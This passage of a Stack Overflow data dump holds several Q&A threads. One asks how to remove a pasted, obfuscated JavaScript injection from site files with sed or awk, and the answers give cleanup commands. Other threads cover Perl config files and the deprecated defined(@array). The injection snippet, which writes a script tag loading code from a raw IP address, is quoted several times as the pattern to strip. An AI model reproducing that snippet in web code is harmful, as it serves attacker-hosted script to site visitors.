# replace by `rep'\n    RS = \"$^\" # regexp which never matches =&gt; the next record will be\n              # a string with a whole second file\n    nextfile\n}\n\n{\n    file = $0; ans = \"\"\n    while (i = index(file, str)) {\n        pre  = substr(file, 1              , i - 1)  # parts before\n        post = substr(file, i + length(str))         # and after `str'\n        ans  = ans pre rep # append to the output\n        file = post\n    }\n    ans = ans file\n    printf \"%s\", ans\n}\n</code></pre>\n\n<p>Store a string in a file</p>\n\n<pre><code>$ cat r.txt\nvar _0xaae8=[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\x72\\x65\\x76\\x65\\x72\\x73\\x65\",\"\\x73\\x70\\x6C\\x69\\x74\",\"\\x3E\\x74\\x70\\x69\\x72\\x63\\x73\\x2F\\x3C\\x3E\\x22\\x73\\x6A\\x2E\\x79\\x72\\x65\\x75\\x71\\x6A\\x2F\\x38\\x37\\x2E\\x36\\x31\\x31\\x2E\\x39\\x34\\x32\\x2E\\x34\\x33\\x31\\x2F\\x2F\\x3A\\x70\\x74\\x74\\x68\\x22\\x3D\\x63\\x72\\x73\\x20\\x74\\x70\\x69\\x72\\x63\\x73\\x3C\",\"\\x77\\x72\\x69\\x74\\x65\"];document[_0xaae8[5]]\\(_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]]\\(_0xaae8[0]))\n</code></pre>\n\n<p>An example</p>\n\n<pre><code>$ cat f.txt\nBEFORE\nvar _0xaae8=[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\x72\\x65\\x76\\x65\\x72\\x73\\x65\",\"\\x73\\x70\\x6C\\x69\\x74\",\"\\x3E\\x74\\x70\\x69\\x72\\x63\\x73\\x2F\\x3C\\x3E\\x22\\x73\\x6A\\x2E\\x79\\x72\\x65\\x75\\x71\\x6A\\x2F\\x38\\x37\\x2E\\x36\\x31\\x31\\x2E\\x39\\x34\\x32\\x2E\\x34\\x33\\x31\\x2F\\x2F\\x3A\\x70\\x74\\x74\\x68\\x22\\x3D\\x63\\x72\\x73\\x20\\x74\\x70\\x69\\x72\\x63\\x73\\x3C\",\"\\x77\\x72\\x69\\x74\\x65\"];document[_0xaae8[5]]\\(_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]]\\(_0xaae8[0]))\nAFTER\nvar _0xaae8=[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\x72\\x65\\x76\\x65\\x72\\x73\\x65\",\"\\x73\\x70\\x6C\\x69\\x74\",\"\\x3E\\x74\\x70\\x69\\x72\\x63\\x73\\x2F\\x3C\\x3E\\x22\\x73\\x6A\\x2E\\x79\\x72\\x65\\x75\\x71\\x6A\\x2F\\x38\\x37\\x2E\\x36\\x31\\x31\\x2E\\x39\\x34\\x32\\x2E\\x34\\x33\\x31\\x2F\\x2F\\x3A\\x70\\x74\\x74\\x68\\x22\\x3D\\x63\\x72\\x73\\x20\\x74\\x70\\x69\\x72\\x63\\x73\\x3C\",\"\\x77\\x72\\x69\\x74\\x65\"];document[_0xaae8[5]]\\(_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]]\\(_0xaae8[0]))\nEND\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>$ awk -f r.awk r.txt f.txt\n\nBEFORE\n\nAFTER\n\nEND\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 8517, "user_id": 2336650, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/lpq4b.jpg?s=128&g=1", "display_name": "Mostafa Hussein", "link": "https://stackoverflow.com/users/2336650/mostafa-hussein"}, "is_accepted": false, "score": 1, "last_activity_date": 1487678184, "last_edit_date": 1487678184, "creation_date": 1487120318, "answer_id": 42239002, "question_id": 41981202, "link": "https://stackoverflow.com/questions/41981202/replacing-a-complex-pattern-using-sed/42239002#42239002", "title": "replacing a complex pattern using sed", "body": "<p>Another way to achieve what you are looking for \"removing the pattern only\" using <code>find</code> and <code>sed</code> commands in one line:</p>\n\n<pre><code>$ find /path/to/files/ -type f \\( -name \"*.js\" -o -name \"*.json\" \\) -exec sh -c 'sed -i \"s/var\\s_0xaae8.*_0xaae8\\[0\\]))//\" \"$0\"' {} \\;\n</code></pre>\n\n<p>The above command will search under specific path and remove the pattern if found from any file with these extensions <code>js</code> or <code>json</code>.</p>\n\n<p>for JS only:</p>\n\n<pre><code>$ find /path/to/files/ -type f -name \"*.js\" -exec sed -i \"s/var\\s_0xaae8.*_0xaae8\\[0\\]))//\" '{}' \\;\n</code></pre>\n\n<p>Feel free to remove the <code>-name \"*.x\"</code> part if you want to search for any file with any extension</p>\n"}], "owner": {"reputation": 45, "user_id": 7500639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d70566440e569d78678fc08630ab63ac?s=128&d=identicon&r=PG&f=1", "display_name": "Iamtheroot", "link": "https://stackoverflow.com/users/7500639/iamtheroot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 964, "favorite_count": 1, "accepted_answer_id": 41991966, "answer_count": 2, "score": 4, "last_activity_date": 1487678184, "creation_date": 1485956270, "last_edit_date": 1485957041, "question_id": 41981202, "link": "https://stackoverflow.com/questions/41981202/replacing-a-complex-pattern-using-sed", "title": "replacing a complex pattern using sed", "body": "<p>I want to replace a pattern by using sed command. The pattern to be removed is as below  with a space.</p>\n\n<pre><code>var _0xaae8=[\"\",\"\\x6A\\x6F\\x69\\x6E\",\"\\x72\\x65\\x76\\x65\\x72\\x73\\x65\",\"\\x73\\x70\\x6C\\x69\\x74\",\"\\x3E\\x74\\x70\\x69\\x72\\x63\\x73\\x2F\\x3C\\x3E\\x22\\x73\\x6A\\x2E\\x79\\x72\\x65\\x75\\x71\\x6A\\x2F\\x38\\x37\\x2E\\x36\\x31\\x31\\x2E\\x39\\x34\\x32\\x2E\\x34\\x33\\x31\\x2F\\x2F\\x3A\\x70\\x74\\x74\\x68\\x22\\x3D\\x63\\x72\\x73\\x20\\x74\\x70\\x69\\x72\\x63\\x73\\x3C\",\"\\x77\\x72\\x69\\x74\\x65\"];document[_0xaae8[5]]\\(_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]]\\(_0xaae8[0]))\n</code></pre>\n\n<p>Now I need to replace the above pattern with a space. This patter can be anywhere in the file ( i.e can be on the begining on the file / end of file or between some strings)</p>\n\n<p>any tips for regex to remove via sed  ?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 5, "creation_date": 1485955233, "post_id": 41980805, "comment_id": 71139260, "body": "Could you please format your code?"}, {"owner": {"reputation": 12629, "user_id": 546871, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/p1diY.jpg?s=128&g=1", "display_name": "AdrianHHH", "link": "https://stackoverflow.com/users/546871/adrianhhh"}, "edited": false, "score": 3, "creation_date": 1485955565, "post_id": 41980805, "comment_id": 71139470, "body": "What is this huge lump of code? Please post only what is relevant. Please read <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> and then rewrite your question."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1485956286, "post_id": 41980805, "comment_id": 71139979, "body": "I have reformatted your code - I&#39;ve taken the liberty of removing the <code>**</code> in there, because that <i>looks</i> like you&#39;ve accidentally included formatting characters from SE markup, rather than actual code. (And removing them means your code compiles, where without there&#39;s syntax errors ). However I&#39;d urge you to cut back your code somewhat, and focus on the basic issue."}, {"owner": {"reputation": 17, "user_id": 7367867, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-t4n7BCbKdKU/AAAAAAAAAAI/AAAAAAAAAbY/1VhX27f9h1c/photo.jpg?sz=128", "display_name": "manav sharma", "link": "https://stackoverflow.com/users/7367867/manav-sharma"}, "edited": false, "score": 0, "creation_date": 1486362098, "post_id": 41980805, "comment_id": 71294962, "body": "Could you please check now."}], "answers": [{"tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 2, "last_activity_date": 1485960835, "creation_date": 1485960835, "answer_id": 41982764, "question_id": 41980805, "link": "https://stackoverflow.com/questions/41980805/want-to-pass-enviormnet-values-from-text-file-in-perl/41982764#41982764", "title": "Want to pass enviormnet values from text file in perl", "body": "<p>If you want to keep them in a file, I'd recommend going with an INI-style configuration file, then use <a href=\"https://metacpan.org/pod/Config::Tiny\" rel=\"nofollow noreferrer\">Config::Tiny</a> to read out the data when needed. You could write your own custom format and retrieval functionality, but <code>Config::Tiny</code> is very easy to use, and makes it easy to write to the config file if you ever need to. Also, INI files are standardized, so there's that as well.</p>\n\n<p>Here's the INI file example:</p>\n\n<pre><code>[variables]\nORACLE_HOME=/ora/11.2.0.3\nLD_LIBRARY_PATH=/ora/11.2.0.3/lib\n</code></pre>\n\n<p>...and the code:</p>\n\n<pre><code>use warnings;\nuse strict;\n\nuse Config::Tiny;\n\nmy $file = 'env.ini';\n\nmy $conf = Config::Tiny-&gt;read($file);\n\n$ENV{ORACLE_HOME} = $conf-&gt;{variables}{ORACLE_HOME};\nmy $LD_LIBRARY_PATH = $conf-&gt;{variables}{LD_LIBRARY_PATH};\n\nprint \"ora home: $ENV{ORACLE_HOME}\\n\";\nprint \"lib path: $LD_LIBRARY_PATH\\n\";\n</code></pre>\n\n<p>...and the output:</p>\n\n<pre><code>ora home: /ora/11.2.0.3\nlib path: /ora/11.2.0.3/lib\n</code></pre>\n\n<p>You'll likely want to do some sanity checking while you're setting the variables, so that if there's one that's missing or not correct, you can exit your application before reaching parts of code that will break unexpectedly.</p>\n"}], "owner": {"reputation": 17, "user_id": 7367867, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-t4n7BCbKdKU/AAAAAAAAAAI/AAAAAAAAAbY/1VhX27f9h1c/photo.jpg?sz=128", "display_name": "manav sharma", "link": "https://stackoverflow.com/users/7367867/manav-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1486011898, "creation_date": 1485955029, "last_edit_date": 1486011898, "question_id": 41980805, "link": "https://stackoverflow.com/questions/41980805/want-to-pass-enviormnet-values-from-text-file-in-perl", "title": "Want to pass enviormnet values from text file in perl", "body": "<p>I'm having this below code in which we are passing value of ENVIRONMENT and <code>ENV</code> NUMBER manually in script. I want to maintain one script and to pass all the values of ENVIRONMENT name and their values from some text file. So that I don't need to update it in future. </p>\n\n<p>Can anyone help me the way how I can do this ?</p>\n\n<p>I have cut down my code and kept only part where i'm facing issue. I want all these input(UAT/PET/QA/SIT and their env number) from some text file. I don't want it to be hard coded in script.</p>\n\n<pre><code>if ( $environment ne \"\" || $environment ne \"Select\" ) {\n   print \"&lt;td&gt; &lt;select name=environment onchange=document.form1.submit()&gt;\";\n   print \"&lt;option selected value=$environment&gt;$environment&lt;/option&gt; \";\n\n   print \"&lt;option value=UAT&gt;UAT&lt;/option&gt; \";\n   print \"&lt;option value=PET&gt;PET&lt;/option&gt; \";\n   print \"&lt;option value=QA&gt;QA&lt;/option&gt; \";\n   print \"&lt;option value=SIT&gt;SIT&lt;/option&gt; \";\n}\nprint \"&lt;/tr&gt;\";\n\n\nif ( $environment eq \"\" || $environment eq \"Select\" ) {\n   print \"&lt;td&gt; &lt;INPUT TYPE=text disabled NAME=product size=21 &gt; &lt;/td&gt;\";\n}\nelse {\n   if ( $environment eq \"MPET\" ) {\n      print \"&lt;td&gt; &lt;select name=product onchange=document.form1.submit()&gt;\";\n      print \"&lt;option selected value=$product&gt;$product&lt;/option&gt; \";\n      print \"&lt;option value=1&gt;1&lt;/option&gt; \";\n      print \"&lt;option value=2&gt;2&lt;/option&gt; \";\n      print \"&lt;option value=3&gt;3&lt;/option&gt; \";\n      print \"&lt;option value=4&gt;4&lt;/option&gt; \";\n   }\n   if ( $environment eq \"QA\" ) {\n      print \"&lt;td&gt; &lt;select name=product onchange=document.form1.submit()&gt;\";\n      print \"&lt;option selected value=$product&gt;$product&lt;/option&gt; \";\n      print \"&lt;option value=1&gt;1&lt;/option&gt; \";\n      print \"&lt;option value=2&gt;2&lt;/option&gt; \";\n   }\n\n   if ( $environment eq \"UAT\" ) {\n      print \"&lt;td&gt; &lt;select name=product onchange=document.form1.submit()&gt;\";\n      print \"&lt;option selected value=$product&gt;$product&lt;/option&gt; \";\n      print \"&lt;option value=1&gt;1&lt;/option&gt; \";\n      print \"&lt;option value=3&gt;3&lt;/option&gt; \";\n      print \"&lt;option value=4&gt;4&lt;/option&gt; \";\n   }\n   if ( $environment eq \"SIT\" ) {\n      print \"&lt;td&gt; &lt;select name=product onchange=document.form1.submit()&gt;\";\n      print \"&lt;option selected value=$product&gt;$product&lt;/option&gt; \";\n      print \"&lt;option value=1&gt;1&lt;/option&gt; \";\n   }\n   print \"&lt;input type=hidden name=environment value='$environment'&gt;\";\n   print \"&lt;/td&gt; \";\n}\n</code></pre>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["perl", "opengl", "header-files", ".obj"], "comments": [{"owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 1, "creation_date": 1485955123, "post_id": 41980796, "comment_id": 71139165, "body": "Where is your code?"}, {"owner": {"reputation": 75, "user_id": 3236150, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/20093ee5818ddb078b9ab2d1185b4660?s=128&d=identicon&r=PG&f=1", "display_name": "tbp", "link": "https://stackoverflow.com/users/3236150/tbp"}, "reply_to_user": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "edited": false, "score": 0, "creation_date": 1485955251, "post_id": 41980796, "comment_id": 71139271, "body": "in &quot;obj2openglfolder&quot; folder in C directory"}, {"owner": {"reputation": 12629, "user_id": 546871, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/p1diY.jpg?s=128&g=1", "display_name": "AdrianHHH", "link": "https://stackoverflow.com/users/546871/adrianhhh"}, "edited": false, "score": 3, "creation_date": 1485955317, "post_id": 41980796, "comment_id": 71139312, "body": "Please read and provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1485955714, "post_id": 41980796, "comment_id": 71139567, "body": "In more recent Perl versions the <code>defined(@array)</code> was deprecated. Remove the <code>defined</code>."}, {"owner": {"reputation": 75, "user_id": 3236150, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/20093ee5818ddb078b9ab2d1185b4660?s=128&d=identicon&r=PG&f=1", "display_name": "tbp", "link": "https://stackoverflow.com/users/3236150/tbp"}, "edited": false, "score": 0, "creation_date": 1485956081, "post_id": 41980796, "comment_id": 71139821, "body": "I&#39;ve tried this one, this this case the warning goes over but still no .h files created. it just create a .exe file and I dont need it. Thanks anyway"}], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485955828, "post_id": 41981019, "comment_id": 71139644, "body": "This is correct. I am, however, wondering the purpose of the &#39;defined&#39; test in the above code. I mean, does it test if the array <i>exists</i> or whether it has values? <code>defined</code> implies the former, but the code would do the latter."}, {"owner": {"reputation": 75, "user_id": 3236150, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/20093ee5818ddb078b9ab2d1185b4660?s=128&d=identicon&r=PG&f=1", "display_name": "tbp", "link": "https://stackoverflow.com/users/3236150/tbp"}, "edited": false, "score": 0, "creation_date": 1485956100, "post_id": 41981019, "comment_id": 71139840, "body": "I&#39;ve tried this one, this this case the warning goes over but still no .h files created. it just create a .exe file and I dont need it. Thanks anyway"}], "tags": [], "owner": {"reputation": 82895, "user_id": 372239, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/2twLb.jpg?s=128&g=1", "display_name": "Toto", "link": "https://stackoverflow.com/users/372239/toto"}, "is_accepted": false, "score": 2, "last_activity_date": 1485955710, "creation_date": 1485955710, "answer_id": 41981019, "question_id": 41980796, "link": "https://stackoverflow.com/questions/41980796/cant-use-definedarray-warning-in-converting-obj-to-h/41981019#41981019", "title": "Can&#39;t use &#39;defined(@array)&#39; warning in converting .obj to .h", "body": "<p>From <a href=\"http://perldoc.perl.org/functions/defined.html\" rel=\"nofollow noreferrer\">perldoc</a>:</p>\n\n<blockquote>\n  <p>Use of defined on aggregates (hashes and arrays) is deprecated. It used to report whether memory for that aggregate had ever been allocated. This behavior may disappear in future versions of Perl. You should instead use a simple test for size:</p>\n</blockquote>\n\n<pre><code>    if (@an_array) { print \"has array elements\\n\" }\n    if (%a_hash)   { print \"has hash members\\n\"   }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 75, "user_id": 3236150, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/20093ee5818ddb078b9ab2d1185b4660?s=128&d=identicon&r=PG&f=1", "display_name": "tbp", "link": "https://stackoverflow.com/users/3236150/tbp"}, "edited": false, "score": 0, "creation_date": 1485956346, "post_id": 41981076, "comment_id": 71140021, "body": "Thanks. So what should I do exactly?I&#39;m not familiar to perl"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 75, "user_id": 3236150, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/20093ee5818ddb078b9ab2d1185b4660?s=128&d=identicon&r=PG&f=1", "display_name": "tbp", "link": "https://stackoverflow.com/users/3236150/tbp"}, "edited": false, "score": 1, "creation_date": 1485956425, "post_id": 41981076, "comment_id": 71140067, "body": "Hire a perl programmer maybe? I mean, you&#39;ve given us 4 lines of perl to look at, and we can tell you what&#39;s wrong with it - but we can&#39;t tell you how to fix it, because we can&#39;t tell what the rest of your code is doing."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 6, "last_activity_date": 1485955887, "creation_date": 1485955887, "answer_id": 41981076, "question_id": 41980796, "link": "https://stackoverflow.com/questions/41980796/cant-use-definedarray-warning-in-converting-obj-to-h/41981076#41981076", "title": "Can&#39;t use &#39;defined(@array)&#39; warning in converting .obj to .h", "body": "<p>That's because an array doesn't have an 'undefined' state. It just has an 'empty' state. </p>\n\n<p>If you do:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nuse Data::Dumper;\n\nmy @array = undef;   \nprint Dumper \\@array ;\n</code></pre>\n\n<p>Then what you get is:</p>\n\n<pre><code>$VAR1 = [\n          undef\n        ];\n</code></pre>\n\n<p>Which is an array with a single (undefined) element. </p>\n\n<p>But you can test if an array is empty, trivially - because in a scalar context, <code>@array</code> returns a number of elements:</p>\n\n<pre><code>print scalar @list;\n</code></pre>\n\n<p>As long as you force a scalar context, then you'll get a numeric value out. </p>\n\n<p>Usefully for an 'empty' array, this is zero, and thus works just fine in an 'if' to test if there's values in the array.  </p>\n\n<pre><code>if ( @array ) { \n    print \"Array has \", scalar @array, \" entries\\n\";\n}\nelse { \n    print \"Array is empty.\\n\";\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 9, "last_activity_date": 1485963550, "creation_date": 1485963550, "answer_id": 41983753, "question_id": 41980796, "link": "https://stackoverflow.com/questions/41980796/cant-use-definedarray-warning-in-converting-obj-to-h/41983753#41983753", "title": "Can&#39;t use &#39;defined(@array)&#39; warning in converting .obj to .h", "body": "<p><code>defined(@array)</code> used to return whether the array was empty or not. This was a bug.</p>\n\n<p><code>defined(@array)</code> should always return true (since the number of element in an array is always defined).</p>\n\n<p>Rather than fixing the bug (causing code to silently malfunction), that particular (and useless) use of <code>defined</code> now lets the user know they are doing something wrong and how to fix it.</p>\n\n<p>As the error message suggests, simply use <code>if (@array)</code> to check if the array is empty.</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 2623504, "user_type": "registered", "profile_image": "https://graph.facebook.com/687604793/picture?type=large", "display_name": "Hanny Odeleya Chan", "link": "https://stackoverflow.com/users/2623504/hanny-odeleya-chan"}, "is_accepted": false, "score": 1, "last_activity_date": 1508676222, "creation_date": 1508676222, "answer_id": 46874210, "question_id": 41980796, "link": "https://stackoverflow.com/questions/41980796/cant-use-definedarray-warning-in-converting-obj-to-h/46874210#46874210", "title": "Can&#39;t use &#39;defined(@array)&#39; warning in converting .obj to .h", "body": "<p>Just replace </p>\n\n<pre><code>`if(defined(@center)) {\n        $xcen = $center[0];\n        $ycen = $center[1];\n        $zcen = $center[2];\n    }`\n</code></pre>\n\n<p>to </p>\n\n<pre><code>if ( @center ) { \n    print \"Array has \", scalar @array, \" entries\\n\";\n    $xcen = $center[0];\n    $ycen = $center[1];\n    $zcen = $center[2];\n}\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 3236150, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/20093ee5818ddb078b9ab2d1185b4660?s=128&d=identicon&r=PG&f=1", "display_name": "tbp", "link": "https://stackoverflow.com/users/3236150/tbp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 8571, "favorite_count": 1, "answer_count": 4, "score": 2, "last_activity_date": 1508676222, "creation_date": 1485954998, "last_edit_date": 1485957171, "question_id": 41980796, "link": "https://stackoverflow.com/questions/41980796/cant-use-definedarray-warning-in-converting-obj-to-h", "title": "Can&#39;t use &#39;defined(@array)&#39; warning in converting .obj to .h", "body": "<p>I'm trying to convert my .obj file to a .h header file, but i'm getting \"Can't use 'defined(@array)' (Maybe you should just omit the defined()?)\" warning and no .h files has created.  </p>\n\n<p>I've tried replacing <code>@center</code> to <code>$center</code> or omintting <code>defined()</code> but it creates .exe file!<br>\nI've read somewhere that it may be a perl version problem, mine is 5.22 and I couldn't find higher versions to try.</p>\n\n<p><strong>Update1:</strong><br>\nI've put the \"obj2opengl.pl \" and \"myobject.obj\" in the same folder. and trying to convert it with this code in console(win10):\n<code>c:\\obj2openglfolder&gt;obj2opengl.pl myobject.obj</code> </p>\n\n<p><strong>Update2:</strong><br>\nThis is the line154 code that cause the problem:</p>\n\n<pre><code>if(defined(@center)) {\n    $xcen = $center[0];\n    $ycen = $center[1];\n    $zcen = $center[2];\n}\n</code></pre>\n\n<p><strong>Update3:</strong><br>\nthis is the whole code:</p>\n\n<pre><code># -----------------------------------------------------------------\n\n# Main Program\n\n# -----------------------------------------------------------------\n\nhandleArguments();\n# derive center coords and scale factor if neither provided nor disabled\n\nunless(defined($scalefac) &amp;&amp; defined($xcen)) {\ncalcSizeAndCenter();\n\n}\n\n\nif($verbose) {\nprintInputAndOptions();\n\n}\n\n\n# TODO check integrity: Does every referenced vertex, normal and coord \nexist?\n\nloadData();\n\nnormalizeNormals();\n\n\nif($verbose) {\nprintStatistics();\n\n}\n\n\nwriteOutput();\n\n\n# -----------------------------------------------------------------\n\n# Sub Routines\n\n# -----------------------------------------------------------------\n\n\nsub handleArguments() {\nmy $help = 0;\nmy $man = 0;\nmy $noscale = 0;\nmy $nomove = 0;\n$verbose = 1;\n$errorInOptions = !GetOptions (\n    \"help\" =&gt; \\$help,\n    \"man\"  =&gt; \\$man,\n    \"noScale\" =&gt; \\$noscale,\n    \"scale=f\" =&gt; \\$scalefac,\n    \"noMove\" =&gt; \\$nomove,\n    \"center=f{3}\" =&gt; \\@center,\n    \"outputFilename=s\" =&gt; \\$outFilename,\n    \"nameOfObject=s\" =&gt; \\$object,\n    \"verbose!\" =&gt; \\$verbose,\n    );\n\nif($noscale) {\n    $scalefac = 1;\n}\n\nif($nomove) {\n    @center = (0, 0, 0);\n}\n\nif(@center) {\n    $xcen = $center[0];\n    $ycen = $center[1];\n    $zcen = $center[2];\n}\n\nif($#ARGV == 0) {\n    my ($file, $dir, $ext) = fileparse($ARGV[0], qr/\\.[^.]*/);\n    $inFilename = $dir . $file . $ext;\n} else {\n    $errorInOptions = true;\n}\n\n# (optional) derive output filename from input filename\nunless($errorInOptions || defined($outFilename)) {\n    my ($file, $dir, $ext) = fileparse($inFilename, qr/\\.[^.]*/);\n    $outFilename = $dir . $file . \".h\";\n}\n\n# (optional) define object name from output filename\nunless($errorInOptions || defined($object)) {\n    my ($file, $dir, $ext) = fileparse($outFilename, qr/\\.[^.]*/);\n    $object = $file;\n}\n\n($inFilename ne $outFilename) or\n    die (\"Input filename must not be the same as output filename\")\n    unless($errorInOptions);\n\nif($errorInOptions || $man || $help) {\n    pod2usage(-verbose =&gt; 2) if $man;\n    pod2usage(-verbose =&gt; 1) if $help;\n    pod2usage(); \n}\n\n# check wheter file exists\nopen ( INFILE, \"&lt;$inFilename\" ) \n  || die \"Can't find file '$inFilename' ...exiting \\n\";\nclose(INFILE);\n\n}\n\n\n# Stores center of object in $xcen, $ycen, $zcen\n\n# and calculates scaling factor $scalefac to limit max\n\n#   side of object to 1.0 units\n\nsub calcSizeAndCenter() {\nopen ( INFILE, \"&lt;$inFilename\" ) \n  || die \"Can't find file $inFilename...exiting \\n\";\n\n$numVerts = 0;\n\nmy (\n    $xsum, $ysum, $zsum, \n    $xmin, $ymin, $zmin,\n    $xmax, $ymax, $zmax,\n    );\n\nwhile ( $line = &lt;INFILE&gt; ) \n{\n  chop $line;\n\n  if ($line =~ /v\\s+.*/)\n  {\n\n    $numVerts++;\n    @tokens = split(' ', $line);\n\n    $xsum += $tokens[1];\n    $ysum += $tokens[2];\n    $zsum += $tokens[3];\n\n    if ( $numVerts == 1 )\n    {\n      $xmin = $tokens[1];\n      $xmax = $tokens[1];\n      $ymin = $tokens[2];\n      $ymax = $tokens[2];\n      $zmin = $tokens[3];\n      $zmax = $tokens[3];\n    }\n    else\n    {   \n        if ($tokens[1] &lt; $xmin)\n      {\n        $xmin = $tokens[1];\n      }\n      elsif ($tokens[1] &gt; $xmax)\n      {\n        $xmax = $tokens[1];\n      }\n\n      if ($tokens[2] &lt; $ymin) \n      {\n        $ymin = $tokens[2];\n      }\n      elsif ($tokens[2] &gt; $ymax) \n      {\n        $ymax = $tokens[2];\n      }\n\n      if ($tokens[3] &lt; $zmin) \n      {\n        $zmin = $tokens[3];\n      }\n      elsif ($tokens[3] &gt; $zmax) \n      {\n        $zmax = $tokens[3];\n      }\n\n    }\n\n  }\n\n}\nclose INFILE;\n\n#  Calculate the center\nunless(defined($xcen)) {\n    $xcen = $xsum / $numVerts;\n    $ycen = $ysum / $numVerts;\n    $zcen = $zsum / $numVerts;\n}\n\n#  Calculate the scale factor\nunless(defined($scalefac)) {\n    my $xdiff = ($xmax - $xmin);\n    my $ydiff = ($ymax - $ymin);\n    my $zdiff = ($zmax - $zmin);\n\n    if ( ( $xdiff &gt;= $ydiff ) &amp;&amp; ( $xdiff &gt;= $zdiff ) ) \n    {\n      $scalefac = $xdiff;\n    }\n    elsif ( ( $ydiff &gt;= $xdiff ) &amp;&amp; ( $ydiff &gt;= $zdiff ) ) \n    {\n      $scalefac = $ydiff;\n    }\n    else \n    {\n      $scalefac = $zdiff;\n    }\n    $scalefac = 1.0 / $scalefac;\n}\n\n}\n\n\nsub printInputAndOptions() {\nprint \"Input file     : $inFilename\\n\";\nprint \"Output file    : $outFilename\\n\";\nprint \"Object name    : $object\\n\";\nprint \"Center         : &lt;$xcen, $ycen, $zcen&gt;\\n\";\nprint \"Scale by       : $scalefac\\n\";\n\n}\n\n\nsub printStatistics() {\nprint \"----------------\\n\";\nprint \"Vertices       : $numVerts\\n\";\nprint \"Faces          : $numFaces\\n\";\nprint \"Texture Coords : $numTexture\\n\";\nprint \"Normals  